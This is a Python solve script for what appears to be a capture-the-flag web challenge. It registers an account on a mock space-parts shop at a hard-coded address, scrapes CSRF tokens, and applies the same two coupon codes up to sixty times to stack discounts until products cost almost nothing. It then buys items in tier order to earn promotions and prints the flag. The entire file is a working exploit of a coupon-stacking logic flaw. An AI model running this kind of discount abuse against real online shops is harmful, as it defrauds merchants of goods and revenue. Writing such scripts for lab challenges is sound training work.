#!/usr/bin/env python3
import requests, sys, re, time

BASE = sys.argv[1] if len(sys.argv) > 1 else 'http://194.102.62.166:22939'
s = requests.Session()

def csrf():
    r = s.get(f'{BASE}/cart')
    m = re.search(r'csrf-token" content="([^"]+)"', r.text)
    return m.group(1) if m else None

def csrf_form(url):
    r = s.get(url)
    m = re.search(r'csrf_token" value="([^"]+)"', r.text)
    return m.group(1), r.text

def status():
    r = s.get(f'{BASE}/shop')
    b = re.search(r'balance-value">([^<]+)', r.text)
    t = re.search(r'tier-badge (\w+)', r.text)
    return float(b.group(1)) if b else 0, t.group(1) if t else '?', r.text

# Register + login
uname = f'sol{int(time.time())}'
c, _ = csrf_form(f'{BASE}/register')
s.post(f'{BASE}/register', data={'csrf_token': c, 'username': uname, 'email': f'{uname}@x.com', 'password': 'password123'})
c, _ = csrf_form(f'{BASE}/login')
s.post(f'{BASE}/login', data={'csrf_token': c, 'username': uname, 'password': 'password123'})

bal, tier, _ = status()
print(f"Start: BBD {bal}, tier: {tier}")

def buy(pid, name):
    c = csrf()
    # Clear and add
    s.post(f'{BASE}/cart/remove', data={'csrf_token': c, 'product_id': pid})
    r = s.post(f'{BASE}/cart/add', data={'csrf_token': c, 'productId': pid, 'quantity': 1})
    d = r.json()
    if 'error' in d:
        print(f"  Add error: {d['error']}")
        return False
    total = d.get('total', 99999)
    
    # Stack coupons
    for _ in range(60):
        for coupon in ['NEWCUSTOMER10', 'SPACESALE15']:
            r = s.post(f'{BASE}/cart/coupon', data={'csrf_token': c, 'coupon': coupon})
            d = r.json()
            if 'total' in d:
                total = d['total']
        if total < 1:
            break
    
    bal, _, _ = status()
    print(f"  {name}: BBD {total:.4f} (balance: {bal})")
    
    if total > bal:
        print(f"  Can't afford!")
        return False
    
    # Checkout
    cf, _ = csrf_form(f'{BASE}/cart')
    r = s.post(f'{BASE}/cart/checkout', data={'csrf_token': cf}, allow_redirects=True)
    bal, tier, text = status()
    print(f"  Bought! Balance: {bal}, Tier: {tier}")
    if 'Congratulations' in text or 'promoted' in r.text:
        m = re.search(r'promoted to <strong[^>]*>([^<]+)', r.text)
        if m: print(f"  PROMOTED: {m.group(1)}")
    return True

# Buy products in tier order
for pid, name in [(1,"Quantum RAM"), (2,"Neutrino SSD"), (4,"Ion Voucher"), (3,"Ion Processor"), (5,"Nvidia GPU"), (6,"Dark Matter PSU")]:
    print(f"\nBuying {name} (id={pid})...")
    if not buy(pid, name):
        print("Retrying with more coupons or different approach...")

# Check flag
r = s.get(f'{BASE}/flag')
m = re.search(r'(UVT\{[^}]+\})', r.text)
if m:
    print(f"\nFLAG: {m.group(1)}")
else:
    print(f"\nFlag page: {r.text[:1000]}")
